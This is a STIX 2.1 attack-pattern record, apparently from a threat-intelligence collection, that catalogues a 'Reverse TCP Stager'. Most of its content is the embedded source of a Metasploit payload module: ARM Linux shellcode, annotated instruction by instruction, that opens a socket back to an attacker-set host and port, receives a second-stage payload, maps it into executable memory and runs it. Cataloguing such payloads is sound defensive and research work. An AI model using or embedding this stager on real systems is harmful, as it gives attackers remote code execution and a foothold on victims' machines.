{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--0d1145d1-ca12-4a0d-8349-879360995e2e",
    "created": "2024-08-14T16:33:19.523914Z",
    "modified": "2024-08-14T16:33:19.523918Z",
    "name": "Reverse TCP Stager",
    "description": "Connect back to the attacker",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/payloads/stagers/linux/armle/reverse_tcp.rb",
            "external_id": "reverse_tcp.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\n\n###\n#\n# ReverseTcp\n# ----------\n#\n# Linux reverse TCP stager.\n#\n###\nmodule MetasploitModule\n\n  CachedSize = 260\n\n  include Msf::Payload::Stager\n\n  def initialize(info = {})\n    super(merge_info(info,\n      'Name'          => 'Reverse TCP Stager',\n      'Description'   => 'Connect back to the attacker',\n      'Author'        => ['nemo <nemo[at]felinemenace.org>', 'tkmru'],\n      'License'       => MSF_LICENSE,\n      'Platform'      => 'linux',\n      'Arch'          => ARCH_ARMLE,\n      'Handler'       => Msf::Handler::ReverseTcp,\n      'Stager'        =>\n        {\n          'Offsets' =>\n            {\n              'LPORT' => [ 242, 'n'    ],\n              'LHOST' => [ 244, 'ADDR' ],\n            },\n          'Payload' =>\n          [\n            # Generated from external/source/shellcode/linux/armle/stager_sock_reverse.s\n            0xe59f70f0,          #        ldr     r7, [pc, #240]    ; set 281(0x119) to r7\n            0xe3a00002,          #        mov     r0, #2\n            0xe3a01001,          #        mov     r1, #1\n            0xe3a02006,          #        mov     r2, #6\n            0xef000000,          #        svc     0x00000000        ; invoke socket\n            0xe3500000,          #        cmp     r0, #0\n            0xba000031,          #        blt     817c <failed>\n            0xe1a0c000,          #        mov     ip, r0\n            0xe2877002,          #        add     r7, r7, #2        ; set 283(0x11b) to r7\n            0xe28f10c4,          #        add     r1, pc, #196      ; set first .word addr to r1\n            0xe3a02010,          #        mov     r2, #16\n            0xef000000,          #        svc     0x00000000        ; invoke connect\n            0xe3500000,          #        cmp     r0, #0\n            0xba00002a,          #        blt     817c <failed>\n            0xe1a0000c,          #        mov     r0, ip\n            0xe24dd004,          #        sub     sp, sp, #4\n            0xe2877008,          #        add     r7, r7, #8        ; set 291(0x123) to r7\n            0xe1a0100d,          #        mov     r1, sp\n            0xe3a02004,          #        mov     r2, #4\n            0xe3a03000,          #        mov     r3, #0\n            0xef000000,          #        svc     0x00000000        ; invoke recv\n            0xe3500000,          #        cmp     r0, #0\n            0xba000021,          #        blt     817c <failed>\n            0xe59d1000,          #        ldr     r1, [sp]\n            0xe59f3094,          #        ldr     r3, [pc, #148]    ; set 0xfffff000 to r3\n            0xe0011003,          #        and     r1, r1, r3\n            0xe3a02001,          #        mov     r2, #1\n            0xe1a02602,          #        lsl     r2, r2, #12\n            0xe0811002,          #        add     r1, r1, r2        ; set 0x1000 to r1\n            0xe3a070c0,          #        mov     r7, #192          ; set 192(0xC0) to r7\n            0xe3e00000,          #        mvn     r0, #0            ; set 0xffffffff to r0\n            0xe3a02007,          #        mov     r2, #7\n            0xe59f3078,          #        ldr     r3, [pc, #120]    ; set r3 to 0x1022\n            0xe1a04000,          #        mov     r4, r0\n            0xe3a05000,          #        mov     r5, #0\n            0xef000000,          #        svc     0x00000000        ; invoke mmap2\n            0xe3700001,          #        cmn     r0, #1\n            0x0a000012,          #        beq     <failed>\n            0xe2877063,          #        add     r7, r7, #99       ; set 291(0x123) to r7\n            0xe1a01000,          #        mov     r1, r0\n            0xe1a0000c,          #        mov     r0, ip\n            0xe3a03000,          #        mov     r3, #0\n                                 #  loop:\n            0xe59d2000,          #        ldr     r2, [sp]\n            0xe2422ffa,          #        sub     r2, r2, #1000\n            0xe58d2000,          #        str     r2, [sp]\n            0xe3520000,          #        cmp     r2, #0\n            0xda000004,          #        ble     80fc <last>\n            0xe3a02ffa,          #        mov     r2, #1000\n            0xef000000,          #        svc     0x00000000        ; invoke recv\n            0xe3500000,          #        cmp     r0, #0\n            0xba000005,          #        blt     817c <failed>\n            0xeafffff5,          #        b       80dc <loop>\n                                 #  last:\n            0xe2822ffa,          #        add     r2, r2, #1000\n            0xef000000,          #        svc     0x00000000        ; invoke recv\n            0xe3500000,          #        cmp     r0, #0\n            0xba000000,          #        blt     817c <failed>\n            0xe1a0f001,          #        mov     pc, r1\n                                 #  failed:\n            0xe3a07001,          #        mov r7, #1\n            0xe3a00001,          #        mov r0, #1\n            0xef000000,          #        svc 0x00000000\n            0x5c110002,          #  .word   0x5c110002\n            0x0100007f,          #  .word   0x0100007f\n            0x00000119,          #  .word   0x00000119\n            0xfffff000,          #  .word   0xfffff000\n            0x00001022           #  .word   0x00001022\n          ].pack(\"V*\")\n\n        }\n      ))\n  end\n\ndef handle_intermediate_stage(conn, payload)\n\n    print_status(\"Transmitting stage length value...(#{payload.length} bytes)\")\n\n    address_format = 'V'\n\n    # Transmit our intermediate stager\n    conn.put( [ payload.length ].pack(address_format) )\n\n    return true\n  end\nend\n",
    "x_mitre_platforms": [
        "linux'"
    ]
}